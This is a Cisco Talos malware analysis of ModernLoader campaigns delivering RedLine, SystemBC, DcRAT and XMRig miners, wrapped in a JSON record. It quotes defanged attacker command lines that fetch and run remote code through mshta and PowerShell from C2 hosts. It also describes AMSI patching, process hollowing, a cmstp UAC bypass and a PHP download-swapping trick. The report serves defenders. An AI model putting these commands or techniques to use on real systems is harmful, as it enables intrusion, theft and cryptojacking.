{
    "id": "e7fc88f0-c899-4366-8e3e-3f5467f3f4eb",
    "created_at": "2023-01-12T15:08:36.786562Z",
    "updated_at": "2025-03-27T02:16:59.158245Z",
    "deleted_at": null,
    "sha1_hash": "c1b85f82979c4836645ac51a1e1fd4845c25871c",
    "title": "2022-08-30 - ModernLoader delivers multiple stealers, cryptominers and RATs",
    "authors": "",
    "file_creation_date": "2022-09-01T10:32:08Z",
    "file_modification_date": "2022-09-01T10:32:08Z",
    "file_size": 1823682,
    "plain_text": "# ModernLoader delivers multiple stealers, cryptominers and RATs\n\n**[blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html](https://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html)**\n\nBy [Vanja Svajcer](https://twitter.com/vanjasvajcer)\n\nCisco Talos recently observed three separate, but related, campaigns between March and June 2022 delivering a variety\nof threats, including the ModernLoader bot, RedLine information-stealer and cryptocurrency-mining malware to victims.\n\nThe actors use PowerShell, .NET assemblies, and HTA and VBS files to spread across a targeted network, eventually\ndropping other pieces of malware, such as the SystemBC trojan and DCRAT, to enable various stages of their operations.\nThe attackers' use of a variety of off-the-shelf tools makes it difficult to attribute this activity to a specific adversary.\n\nThe final payload appears to be ModernLoader, which acts as a remote access trojan (RAT) by collecting system\ninformation and deploying various modules. In the earlier campaigns from March, we also observed the attackers\ndelivering the cryptocurrency mining malware XMRig. The March campaigns appeared to be targeting Eastern European\nusers, as the constructor utility we analyzed had predefined script templates written in Bulgarian, Polish, Hungarian and\nRussian.\n\nThe actors are attempting to compromise vulnerable web applications to serve malware and deliver threats via files\nmasquerading as fake Amazon gift cards.\n\n## Technical details\n\n**Initial findings**\n\nIn June 2022, Cisco Talos identified an unusual command line execution in our telemetry. The decoded base64 command is\nbelow:\n\n_Initial finding: A command executed on the system._\n\n\n-----\n\nThe 31.41.244[.]231 IP is a Russian IP and hosts several other URLs with similar naming conventions.\n\n**Autostart command**\n\nFollowing the discovery of the initial command, we identified two other command lines. They are a result of an autorun\nregistered executable and the execution of a scheduled task.\n\n_The autorun executable and scheduled task command lines._\n\nThe first command connects to the download server and downloads an HTA application whose script is obfuscated with HTML\nGuardian, an application that encrypts HTML code.\n\n_The content displayed when the HTA file is opened in a browser._\n\nWhen deobfuscated, the HTA file executes the VB script code to download and run PowerShell code from\nhxxp[:]//31[.]41[.]244[.]231/0x?0=Loader, which launches the next stage of the loading process.\n\n_Deobfuscated HTA code._\n\nThe autorunnn.exe module (d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f) is a modified variant\nof the SharpHide open-source utility, which attempts to create a hidden registry entry. It uses NtSetValueKey native API to\ncreate a hidden (null-terminated) registry key by adding a null byte in front of the UNICODE_STRING key valuename. In our\ncase, SharpHide is modified to create the following entry:\n\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell set to run the command: \"explorer.exe, cmd /c mshta\nhxxp://go[.]clss[.]cl/0k#=GoogleWindowsAnalyticsConfiguration\". The program also attempts to create a scheduled task which\nruns when the user logs onto the system. The task name is \"OneDrive Standalone Update Task\" and it will attempt to execute\nthe sams command to download and run the PowerShell loader: \"mshta\nhxxp[:]//go[.]clss[.]cl/0k#=GoogleWindowsAnalyticsConfiguration\".\n\n\n-----\n\n_Modified SharpHide code is used to hide registry startup entry._\n\nThe URL serves PowerShell code which will be executed on the system.\n\nAs part of the logon sequence, the system executes a file, which ensures that the registry entry and the scheduled task set to\ndownload the next stage are set.\n\n**PowerShell loader**\n\nThe next stage is the PowerShell loader. The loader contains embedded code of three modules, which are loaded using\nreflection as additional .NET assemblies into the PowerShell process space. The downloaded PowerShell code also\ndownloads and runs auxiliary modules and payloads.\n\nThere are usually three modules in this loader format. The first disables AMSI scanning functionality, the second is the final\npayload, and the last injects the payload into the process space of a newly created process, usually RegSvcs.exe.\n\nKillAMSI\n\nKillamsi.dll is stored as a base64-encoded string split between the first two encoded characters and the rest of the encoded\nassembly DLL. The DLL contains obfuscated code, which attempts to patch Microsoft's AMSI interface (amsi.dll)\nAmsiScanBuffer function with the code to return an error value. This may prevent antimalware engines to scan executed\nPowerShell code and allow the attacker to bypass the detection of the next stages of the loader execution.\n\n_Amsi.dll is decoded, loaded and its Main function called._\n\nProcess injector\n\nThe last module in the loader file is \"friday.dll.\" It is obfuscated with multiple layers of obfuscation, such as ConfuserEx and\nDotnet reactor. It creates a new process and places the next injector stage into the newly created RegSvcs.exe process.\n\n\n-----\n\n_Friday.dll module is used to inject the next injection stage into RegSvcs.exe process._\n\nThe second-stage injector is an assembly: Managament.inf. It creates an instance of svchost.exe process and injects code\nusing process-hollowing to load the final payload stored in the initial PowerShell loader script.\n\nThe injector creates a svchost.exe process in suspended mode and then allocates virtual memory for the injection of the\npayload module. The original svchost module is unmapped by calling the ZwUnmapViewOfSection.\n\nThis is followed by the fairly common injection sequence of API calls to get thread context, copy the data from the payload to\nthe allocated virtual memory, set the thread context to point to the payload entry point and, finally, to resume the suspended\nthread.\n\nDepending on the bitness of the operating system, the appropriate functions are used for getting and setting the thread\ncontexts of the 32 bit process from the 64 bit operating system. The injected payload is Client.exe\n(3f5856a9ec23f6daf20fe9e42e56da1b8dcb0de66b6628a92b554d6e17c02fc3), a ModernLoader instance.\n\n**ModernLoader bot (aka Avatar bot)**\n\nThe payload for the initial loader URL is a simple .NET remote access trojan, ModernLoader. ModernLoader has been in use\nsince at least 2019, and some researchers are referring to it as \"Avatar bot,\" although it has nothing in common with the rootkit\ndocumented in 2013 using the same name.\n\n_ModernLoader's constructor initializes the bot with a hardcoded C2 URL._\n\nOnce the bot is initialized, it collects the following information about the system and send the information to the C2 server using\nthe HTTP Post request to hxxp[:]//31[.]41[.]244[.]231/AVAVA/gate[.]php:\n\nWin32_ComputerSystemProduct UUID (using WMI to query the configuration data).\nGPU details from Win32_DisplayConfiguration.\nThe AD or the workgroup name.\nThe external IP address by reading the response from http://ipinfo.io/ip.\nThe IP address country by reading the response from http://ipinfo.io/country.\nThe Windows operating system version information.\nThe amount of RAM.\nThe processor architecture and type.\nThe user privileges (admin or user).\nAnti malware products installed on the affected system.\nThe amount of space left.\nThe bot version.\nThe name of the computers on the network (through querying local ActiveDirectory data).\nThe presence of an RDP module on the disk (used as auxiliary payload for the bot).\n\n\n-----\n\nOnce the initial data is sent, ModerLoader reads the response to find tasks returned from the servers using the JSON format.\nModernLoader executes tasks using the function DoTask. DoTask accepts very few commands and can either execute a\ncommand line or download and execute a file. This limited functionality might have prompted the author to call this bot a loader,\nbut for all intents and purposes, it is just a simple remote access trojan (RAT).\n\nThe advantage of using a loader such as ModernLoader is that the actor can change the campaigns and deploy different\nmodules in real time. The way the modules are deployed, the payloads often exist only in RAM and not on the hard drive as\nfiles. Of course, this approach has a major weakness because it relies on a single IP address, which means the campaign is\nterminated as soon as the C2 server is offline. ModernLoader runs in an endless loop periodically contacting the C2 server for\nnew tasks until the process is terminated.\n\nModernLoader is a staple of the campaigns we analyzed. Its main purpose is to download and execute additional payloads and\nmodules, as instructed by the C2 server. Based on our telemetry data and the open-source intelligence, there are more than 10\nadditional modules hosted on the C2, but not all of them were available for download at the time of writing this post.\n\n**Earlier campaigns**\n\nDuring the investigation, we discovered two earlier campaigns from March 2022 that are closely related to the campaign using\n31[.]41[.]244[.]231 as the C2 server. Both campaigns use similar TTPs, with ModerLoader as the main bot that communicates\nwith the C2 server and additional modules served by C2 servers with IP addresses:\n\n62[.]204[.]41[.]192 and\n62[.]204[.]41[.]71\n\nThere are a few clues that confirm the relationship between these campaigns. The first is the task given to one of the infected\nsystems using 62[.]204[.]41[.]71 as the C2 server. We first see the connection of the infected system to the C2 server and then\nthe task to execute a PowerShell command to download and execute a module from 62[.]204[.]41[.]192, the C2 server used in\nanother campaign.\n\n_Connecting two C2 servers in a C2 task assigned to the ModernLoader._\n\nThe link between 31[.]41[.]244[.]231 and 62[.]204[.]41[.]71 is found in a downloader, which is a part of the set of standalone\ndownloaders linked with these campaigns. They usually have the name offer.exe and are written in Visual Basic 6. These\ndownloaders provide the second infection vector.\n\nThe downloader that proves the second link is 27bb9ee41bc7745854e3f3687955f1a6df3bbd74a7d1050a68fe0d0e6087b4b3,\nwhich purports to be an update for the Brave web browser. The sample contains the code to launch PowerShell commands to\ndownload and run the code from:\n\nhxxp[://]31[.]41[.]244[.]2311/AVAVA/WAW/Documents/go[.]oo\nhxxp[://]31[.]41[.]244[.]2311/AVAVA/WAW/APPDATA/go[.]oo\nhxxp[://]62[.]204[.]41[.]71/Offer/Offer[.]oo\n\nAlthough the original IP address here is mistyped, the similarity to the newest C2 IP address is strong enough to link these\ncampaigns.\n\n**Droppers (vs_community.exe theme)**\n\nThe internal name of many droppers is vs_community.exe that is likely done to convince users that the files are part of the\nVisual Studio community edition. Most of the droppers are created with the 7-Zip SFX Constructor tool and the version\ninformation strings are likely kept the same for all of the dropper files created in the campaign.\n\n**Payload modules received from the C2 server**\n\nNo.go\n\n\n-----\n\nhxxp:[//]31[.]41[.]244[.]231/0xNANA/no[.]go is the first URL we discovered when investigating anomalous daily PowerShell\ninvocations. Like the Loader module, it consists of the amsi.dll module with the ability to disable the AMSI interface, the\npayload to be loaded into RegSvcs.exe and the payload injector module friday.dll.\n\nSince we already know how the process injection is implemented, we can focus on the payload. The payload is auto.exe,\n142c333bef9eab4ce9d324e177572423c845ee399c01b4b78cfff730b4cb79b4 and another downloading stage. The stage\ncreates a randomly named VB script and a randomly named installation information .inf file, which is opened using cmstp.exe\n(Connection Manager Profile Installer). The .inf file instructs the system to launch the VB script.\n\nThis somewhat convoluted execution of VB script is a likely attempt to circumvent the Windows User Account Control (UAC).\nThe VB script is very similar to other VB scripts in the campaign and it simply attempts to download and execute PowerShell\ncode from two URLs hosted on the C2 server.\n\n_A randomly named VBS file is stored in the resource section of the auto.exe module._\n\nUnfortunately, at the time of the analysis, but it also seems during the observed attack, the two modules DEKL.go and ya.go\nwere not accessible. Nevertheless, the observed attack chain continues with the request to download and execute the next\nmodule, which is Nana.go, from hxxp[://]31[.]41[.]244[.]231/0xNANA/file/NANA[.]go.\n\nVB scripts employed in these campaigns contain the text that also exists in Emotet macro downloaders. It is not clear if they\nare an artifact of a code generator or they are taken from another source to make the detection of the script more difficult by\nrandomizing some of the content. Although the comments contain grammatically correct sentences, they have very little\n[meaning and may have been generated by something akin to the Markov Chain sentence generator.](https://en.wikipedia.org/wiki/Markov_chain)\n\nNana.go\n\nDuring the observed attack, the Nana.go module is downloaded and executed with the filename 0xNax.exe. The module\nchecksum is 4621924ff1b05ad7c15bc4b5dad68f7c8c3eceaf7824444b149264eff79d4b9a and is packed with UPX. The internal\nfile version string name for this file indicates that it may be a Microsoft Visual Studio community installer. The\nvs_community.exe theme appears in the multiple files of the campaign. The name indicates that it may be spread on file\nsharing websites and P2P networks. The dropped file names in the campaign seem to be chosen to appear as legitimate\nWindows utilities.\n\n\n-----\n\nOnce unpacked, the module is a self extracting 7 Zip file created with the 7 Zip SFX Constructor utility. The utility allows the\nuser to add multiple files from a single folder to the 7-Zip archive with a stub that interprets a configuration data stored\nencrypted within the self-extracting file. The configuration data contains various instructions to the extractor stub, similar to a\nscripting engine. The scripting engine allows the user to specify where the file will be extracted and which commands should be\nrun during the extraction process.\n\nThe Constructor utility seems to be targeted to Eastern European users with predefined script templates in Bulgarian, Polish,\nHungarian and Russian.\n\n_7-Zip SFX Constructor script editor._\n\nThe 7-Zip SFX files are used throughout the campaign and nana.go is just one of them. When executed, it will drop and launch\ntwo additional modules - C:\\Users\\<Username>\\AppData\\Roaming\\Log\\AppData.exe,\n7e73bc53cd4e540e1d492e6fd8ff630354cd8a78134e99bc0b252eccb559c97a and C:\\Users\\\n<Username>\\AppData\\Roaming\\Log\\OneDrive.exe,\neb37c756c60a75068bfe88addd24e209080fe5383d25c919ea40fe78fff98612.\n\nAppData.exe is another self-extracting 7-Zip file with the internal filename vs_community.exe. When executed, it drops and\nruns the following files:\n\nC:\\Users\\<Username>\\AppData\\Roaming\\WinServer\\Log.exe\n(3f2f84147c55e5fc42261ace15ad55239d0bcba31a9acd20b99c999efbb9d392)\nC:\\Users\\<Username>\\AppData\\Roaming\\WinServer\\AppData.exe (\nd9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f)\n\nThe appdata.exe in the WinServer folder is identical to the already mentioned AUTORUNNN.exe, which sets the registry key to\nlaunch the infection process when the user logs into the system. The module Log.exe drops and runs additional files:\n\nC:\\Users\\<Username>\\AppData\\Roaming\\UpdatersHelper\\UpdatersHelper.exe\n(852857c66ee72f264c26d69c1f4092e99c2ed1fdcfef875f982fb75ed620ccc0). Internally the module name is\nBypassDefender. This seems to be a variant of the BypassDefender project whose source code is available on GitHub\nand the purpose is to disable Windows defender by stopping its service and the associated processes.\n\n\n-----\n\nC:\\Users\\ Username \\AppData\\Roaming\\UpdatersHelper\\UpdatersHelper.bat\n(435aa8b19125d795ada322aa8e30f3dd9afa03a4ac1350177c920426d1b17a47). This is a batch file that sets a\nscheduled job to run the UpdatersHelper.exe executable module and sets its attributes to the system and hidden so that it\nis not displayed in the default Windows Explorer view\n\nOneDrive module is an injector that injects a .NET loader into the process space of conhost.exe. The injected shellcode sets up\nthe process for the next injection stage, which is a .NET assembly that drops and loads additional modules and starts a copy of\nXMRig to mine Monero using a pool on pool.hashvault.pro using the pool address\n44Ds8fbC3HWQCcwQotgrNDUWnmDixpQPG7YLh5h2rzSMQrxCRXeSjQvH8LRPNGSyqvXcKeEk3umZ7T2wzFAgovF15UckBxg.\n\n_Xmrig's connection to a cryptomining pool._\n\nBased on the observed traffic in the Hashvault dashboard, it seems that the number of infected systems using this particular\npool is in the low hundreds, with relatively low mining yield. Looking at the geography, most of the connections are coming from\nIndonesia and other Asian countries, along with Eastern Europe.\n\n_OneDrive.exe miner pool hash rate in second half of June._\n\nBefore executing the miner, the loader will attempt to load a watchdog process as well as the kernel driver that allows the\nwriting of memory in kernel mode. The watchdog process, sihost64.exe, ensures that the miner is restored if the miner file is\ndeleted and its process is restarted if terminated. Several other commands exist that could disable Windows and Windows\nDefender.\n\n_Miner loader attempts to disable Windows update._\n\nA scheduled task GoogleUpdateTaskMachineQC runs every time the user logs onto the system and launches the\nOneDrive exe miner from C:\\Users\\<Users>\\AppData\\Roaming\\OneDrive\\OneDrive exe The initial stub and the shellcode of\n\n\n-----\n\nthe file is very similar to miners generated with a version of Silent Crypto Miner generator and the structure of the miner loader\nis also consistent with the loaders generated by the Silent Crypto Miner and SilentXMR projects.\n\n_Decompiled miner loader code._\n\n_Silent Crypto Miner loader source code._\n\nSilent Crypto Miner is a generator that allows users with little knowledge of programming to create effective and resilient miner\nloaders.\n\n_Silent cryptocurrency miner builder form._\nMeta, ww.cc and RegAsm.go\n\nThe PowerShell meta module is a loader that uses the similar three-assembly scheme to inject the payload beachy.exe into the\nprocess space of a newly created RegSvcs.exe process. Beachy.exe\n(b71c43bf7af23ed6a12bdb7ce96a4755b8a7f285b8aa802484e8b2dfa191f14e) is an obfuscated instance of the RedLine\nstealer using encrypted strings and legitimate class and function names to connect to the IP address 31[.]41[.]244[.]235:45692\nas the C2 server.\n\n\n-----\n\n_Standard RedLine stealer authorization disguised as legitimate software._\nRedLine URL module\n\nContrary to the URL name that serves this module, hxxp[://]31[.]41[.]244[.]231/0x/?0=RedLine, this module does not inject a\nvariant of the RedLine stealer, but a variant of the ModernLoader bot\n(53b09a7c8bf41ed9015b8e3a98fb8b8581e82d17c1ead0bd0293f2e3e9996519).\n\nAs is the case with the original Loader module, the RedLine PowerShell script creates a new RegSvcs.exe hollowed process\nthat launches the next stage of the injector that eventually moves the ModernLoader assembly client.exe into a newly created\nand hollowed svchost.exe process. This connects to the latest ModernLoader C2 script at\nhxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php.\n\nThe RedLine module is usually downloaded by any of the standalone offer.exe executables\n(dc5255a5bcc89266ea0c7ca79f7a52ab281cbb6cc1980ee5b3a818114c01b93c), which also eventually downloads other\nmodules to be executed:\n\nhxxp[://]31[.]41[.]244[.]231/0xMine/RegAsm[.]go\nhxxp[://]31[.]41[.]244[.]231/0xSocks/go[.]go - a simple script to download and launch socks.go module\nhxxp[://]31[.]41[.]244[.]231/0xMine/go[.]go - a simple script to download and launch mine.go module\n\nMine.go\n\nAs opposed to the original and the RedLine loaders the Mine.go and Socks.go modules are not PowerShell scripts but\nWindows PE executables that are downloaded and launched by the previous commands downloaded from\nhxxp[://]31[.]41[.]244[.]231/0xMine/go[.]go and hxxp[://]31[.]41[.]244[.]231/0xSocks/go[.]go respectively.\n\nThe embedded modules in resources (encrypted) are:\n\nSihost64 (watchdog): Ensures the miner is running, injected by runpe module loaded into conhost.exe.\nInjector (RunPE.Run): Injects PE files in a process name specified as an argument to the function.\nWR64.sys: Driver that may allow writing to kernel mode memory.\nmr: XMRig executable for Monero mining.\nth: ethminer.\n\n\n-----\n\n_Decompiled miner code._\n\nThe .NET miner loader is very similar to the code generated by the Silent cryptocurrency miner, as seen in the Nana.go\nOneDrive.exe miner.\n\nThe major difference between the two is in the folders used to drop additional components and the mining pool site used for\nmining. Mine.go is using pool.supportxmr.com on TCP port 3333 for mining and the address is the same:\n44Ds8fbC3HWQCcwQotgrNDUWnmDixpQPG7YLh5h2rzSMQrxCRXeSjQvH8LRPNGSyqvXcKeEk3umZ7T2wzFAgovF15UckBxg.\n\nMines.go\n\nThe Mines.go module (21e72be7f818e2afd4d53ee8f16c7e4a4718a95dd75b90d83fa26181e426f578) is another miner, but this\ntime, the actors chose to use the so-called \"Sapphire Multi-Coin\" miner that's advertised on various forums for sale since at\nleast February 2022. The module is observed to be downloaded by a small gos.go script, which is download by one of the\nstandalone downloaders (1c58274fbbeaf7178a478aea5e27b52d5ead7c66e24371a4089568fa6908818c).\nThe miner module\ncopies itself into %LOCALAPPDATA%\\OneDrive\\OneDrive.exe and creates a scheduled task to run the OneDrive.exe every\nminute. The miner creates the mutex 39cb3ed9d64849789471d05f94b7b62a that checks if the module is already running in\nmemory.\n\n_Sapphire miner advertisment._\n\nThe miner is written in Golang and it is a wrapper around the XMRig miner. Based on the configuration, which can be\ndownloaded from a remote server, the golang portion of the miner loads the XMRig miner, sets the registry key to ensure the\n\n\n-----\n\nminer is loaded and prepares the required parameters to choose which crypto currency will be mined based on the amount of\nRAM on the infected system.\n\nThe miner loader will attempt to read the encrypted zip miner archive from the registry entry HKCU>\\SOFTWARE\\Wow64\\\n<SHA256_encrypted> (96cd98d42b896f6c92fd97b435d727497102ca91ce6e95252251a28e0c3fb9f8) if it exists. If it does not,\nthe Sapphire loader will attempt to download it from the URL predefined in its configuration.\n\nBased on the GPU type and the amount of RAM of the infected host, the Sapphire miner injected XMR using process-hollowing\ninto the process space of a newly created svchost.exe process or a smartscreen.exe process.\n\n_The miner executable is downloaded and decrypted before being injected into a process._\n\nThe actual XMRig miner can be stored on the remote server, and in the case of the Mines.go module, the miner is downloaded\nfrom hxxp[://]31[.]41[.]244[.]231/0xMine/Temp[.]exe. The downloaded file is an AES-encrypted ZIP file that contains the XMRig\nminer and the WinRing0x64.sys helper driver. As above the XMRig is configured to use pool.supportxmr.com on TCP port 3333\nwith the same mining pool address.\n\nSocks.go\n\nThe Socks.go module is an executable protected with Themida protector. The module contains a variant of the SystemBC back\nconnect remote access Trojan with proxy functionality. The SystemBC connects to the same C2 IP address as the RedLine\nstealer module — 31[.]41[.]244[.]235 — but it uses TCP port 4440. SystemBC may allow the attacker to use the infected\nsystem as a proxy for their activities.\nAutorun\n\nThe command to download and run the Autorun module by the ModernLoader bot is often observed together with the Meta\nmodule. The autorun downloads and runs the module autorunnn.exe, which sets a scheduled task to download and run the\ninitial infection HTA application file hosted on the C2 server hxxp[://]31[.]41[.]244[.]231/0x?0=WindowsAnalyticsConfiguration. It\nalso modifies a value in the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run so\nthat the same mshta command is run when a user logs onto the system.\n\nHello.go\n\nHello.go module (3232126860f3729dda59f9db6476773997b4bcfb08e2e4b32b5214c30507d775), downloaded by at least one\nof the standalone downloaders (1c58274fbbeaf7178a478aea5e27b52d5ead7c66e24371a4089568fa6908818c), is a\nvs_community.exe UPX packed self-extracting 7-Zip dropper which drops and runs a number of other modules, most of them\nare focused on mining, and some on bypassing Windows defender. The module is similar to the nana.go payload, but contains\nmore components. When the module is run, it drops the following files:\n\n%APPDATA%\\nexts\\killduplicate.cmd\n%APPDATA%\\nexts\\mine.exe - Silent Crypt miner\n%APPDATA%\\nexts\\output.exe\n%LOCALAPPDATA%\\appdata.exe\n%APPDATA%\\winserv\\killduplicate.cmd\n%APPDATA%\\winserv\\appdata.exe\n%APPDATA%\\winserv\\updatershelper.exe\n%APPDATA%\\install+\\appdata.bat\n%APPDATA%\\install+\\killduplicate.cmd\n%APPDATA%\\links\\killduplicate.cmd\n%APPDATA%\\links\\mine.exe\n\n\n-----\n\n%APPDATA%\\link\\killduplicate.cmd\n%APPDATA%\\link\\mine.exe\n%APPDATA%\\link\\mines.exe\n%APPDATA%\\onedrive\\onedrive.exe\n%LOCALAPPDATA%\\onedrive\\onedrive.exe\n%APPDATA%\\drives\\off.bat\n%APPDATA%\\drives\\updatershelper.exe\n%APPDATA%\\google\\libs\\wr64.sys\n\nThe modules are focused on establishing an environment to mine crypto currency, with miners and auxiliary modules tasked\nwith disabling Windows updates and Windows Defender.\n\nWs.go\n\nWs.go module (dd24e5596c318b30c05cffc7467f5649564ab93874c9201bf758a1a2ce05228c) is observed as downloaded and\nexecuted by one of the tasks launched by the C2 server to the ModernLoader.\n\nWs.go contains the already described PowerShell three assembly module loader scheme which attempts to inject the module\nXBinder-Output.exe (40d68523748f6eaf765970a40458faccbe84ef5dff7acbdaf29ac5a69d7cae6f). XBinder-Output exe contains\na VB script WindowsConfiguration.vbs (c103c7686739669f3cfc123de34bdadb803c4ec8727cf12cd7cdc56be4bf60e1) in its\nresource section. The resource is encrypted and when decrypted is saved on the disk as\n%LOCALAPPDATA%\\OneDrive\\WindowsConfiguration.vbs and started.\n\nThe VB script is a wrapper for PowerShell code which attempts to download and run the initial ModernLoader loader module\nfrom hxxp[://]31[.]41[.]244[.]231/0x/Loader[.]go.\n\n_Ws.go drops and runs code to execute the initial ModernLoader loader._\n\nXBinder-Output sets the registry value\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsConfiguration to point to the dropped\nWindowsConfiguration VB script so it is run every time the user logs onto the system.\n\nSmartScreen.ps\n\nDownloaded by 1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5 which first loads a small script\nfrom hxxp[://]31[.]41[.]244[.]231/AVAVA/WAW/APPDATA/go.oo eventually loads an instance of ModernLoader connecting to the\nsame C2 IP URL hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php.\n\nAuto.oo\n\nAuto.oo is an auxiliary module also downloaded by\n1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5, and it launches an instance of SharpHide\n(881235fca4aeeb88950b952c0d9ce1a7d9a4eb838ce7d79447a26d2f45b1eaa5) which creates a hidden registry entry to start a\ncopy of the SmartScreen Module every time the user logs onto the system.\n\nXboxLive.ps\n\nDownloaded by 1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5, which first downloads and runs a\nsmall script from hxxp[://]31[.]41[.]244[.]231/AVAVA/WAW/Documents/go.oo and eventually loads an instance of the\nModernLoader (09db213df3dbd950a8bc75246be72f5b572b00dbd3a5bba45c7074443d0928a7) into the process space of\nsvchost.exe configured to connect to the same C2 URL hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php.\n\nEach campaign has its own unique version name although the functionality of the loader is the same. The first loader version is\n\"Live\" while SmartScreen.ps and XBoxLive.ps each have their own version name which can presumably be tracked in the C2\nserver panel by the operator.\n\nR0.go\n\nThis module has been spotted in the dynamic analysis of the 7-Zip self-extracting dropper\n4a6ef2379195140aa31d339329ca06bd28589fa13fd88cfcf9d76cb2d4ab99c1. The module is a three assembly PowerShell\n\n\n-----\n\nwhich loads an obfuscated injector for a variant of the DcRAT\n(2c631588c491aa32c20f6a99201ba82982a31b1c763054562d59cd1a5a1ea14b).\n\nThe loader is first injected into the process space of RegSvcs.exe and then into the process space of a newly created\nsvchost.exe process.\n\nThe DcRAT client is configured to connect to the IP address 31.41.244.235, just as the other RATs in this campaign. The TCP\nport to use is 8848. At the time of analysis, the host was not accessible.\n\n_Decrypted DcRAT configuration data._\n\n**Additional payloads**\n\nDiscord Spreader\n\nWhile searching for other modules communicating with C2 servers we spotted a file\n838170edffbca1cadef3b7039330376c1aad914883103834c25e9bb92d9bfad1, purporting to be a copy of the µTorrent Web\nBitTorrent client. Once executed the file drops another randomly named file, which is a downloader written in Visual Basic with\nthe code similar to other Offer.exe downloaders. The downloader,\n9b347b48026f205733abbc24c502dfff5428341e10c6944687cdbfe70770f5f3, executes the following PowerShell command to\ndownload and run code from 62[.]204[.]41[.]71.\n\n_Discord Spreader module download._\n\nThe interesting thing about the dropper is that it is based on the Project Discord Spreader, an open-source module available on\nGitHub. The utility is a Discord token stealer which may be used to spread the original file on Discord by sending messages to\nchannels where the user of the stolen Discord tokens is active. The spreader can also include a user-mode rootkit r77 or\nadditional payloads in the assembly ManifestResource stream. A builder is available to create new instances of the spreader\nand the sample used in this campaign was obfuscated with .NET obfuscators.\n\n_The Discord Spreader builder._\n\nThe author also left a message in the code to \"help\" anti-malware researchers when analyzing the sample.\n\n_The message to analysts._\n\n\n-----\n\nThis technique was observed on one of the infected systems in our telemetry. We observed the addition of a fake Amazon\nvoucher named Amazon.com Gift Card 500 USD.gift.hta to archive files, such as RAR, 7-Zip and ZIP already present on the\ninfected system. Each file's checksum is different, which indicates use of mild obfuscation to evade detection.\n\nWe were unable to retrieve those HTA files from the infected systems but found a related file on VirusTotal,\n(5750d8d557fdcb6afb2d8cb52993fb07ac84a63aab0afc44efe30ffe08d48c2f), which contains code to communicate with\n62[.]204[.]41[.]71 and whose filename is \"Amazon Gift Card 500 USD.gift.vbs.\" The script first attempts to call PowerShell to\ndownload and run code from the URL hxxp://62[.]204[.]41[.]71/SPM/Spam.o' and then opens the browser to a link created by\nthe URL shortening service hxxps://goo[.]su/DaqHw open a page that offers the user an alleged free Amazon gift card worth\n$500 USD.\n\nPHP scripts\n\nThe actor seems to be interested in compromising vulnerable web applications and changing their configuration so that\nmalicious PHP scripts serve malicious content to the users of the compromised application. One particular file, artadd.php\n(9704fa1a8242643f66572e7ee68e4e7d7bec9e7054319b8551fed4b3b0ccdd45) has been found in a few instances of\ncompromised WordPress and CPanel applications. The file is obfuscated with a very simple obfuscation scheme and it\neventually executes the code to download additional components futer.php\n(a249c275b0ad384ae1906d2ec169f77abce9d712ab8470eb5fe7040a71948026) and .htaccess\n(f013d15d2203ec6a90be789d4b58c99ca7e42d9beedb9c4c0b05f599e2eb0ea0) from 62[.]204[.]41[.]192.\n\n_PHP script on compromised apps downloads additional components._\n\nThe function of the .htaccess file is in this case to configure redirects to the futer.php if the browser accesses any files on the\nsite with the extensions .zip, .exe or .rar. If the extension in the request matches the above, futer.php will execute code that\nretrieves a file from the actor's command and control (C2) server and serve that instead of the requested executable.\n\n_PHP file attempts to replace a requested file with a malicious file from the C2 server._\n\n### Summary\n\nThis post represents the most notable portions of three campaigns we discovered in June. These campaigns portray an actor\nexperimenting with different technology. The usage of ready-made tools shows that the actor understands the TTPs required\nfor a successful malware campaign but their technical skills are not developed enough to fully develop their own tools. As a\nconsequence of using off-the-shelf tools, the group improves its operational security and there are no obvious signs of who the\nactor behind the attacks is, except that they likely speak Russian.\n\n\n-----\n\n_The most recent ModernLoader campaign modules._\n\nThe actor is frequently using open-source components and code generators to achieve its goals. A number of remote access\ntools, stealers and cryptominers are used in the campaigns to eventually reap financial benefits for the actor. The actor has an\ninterest in alternative distribution channels such as compromised web applications, archive infections and spreading by using\nDiscord webhooks. Despite all the techniques and tactics used we estimate that the success of these campaigns is limited.\nCisco Talos continues to monitor all available sources for signs of similar campaigns.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[post. Try Secure Endpoint for free here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\n\n\n-----\n\n[Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security/index.html)\nYou can try Secure Email for free [here.](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Dcmd-free-trial-request%26utm_term%3Dpgm-talos-trial)\n\n[Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual,](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\n[Adaptive Security Appliance and](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) [Meraki MX can detect malicious activity associated with this threat.](https://meraki.cisco.com/products/appliances)\n\n[Cisco Secure Malware Analytics (Threat Grid) identifies malicious 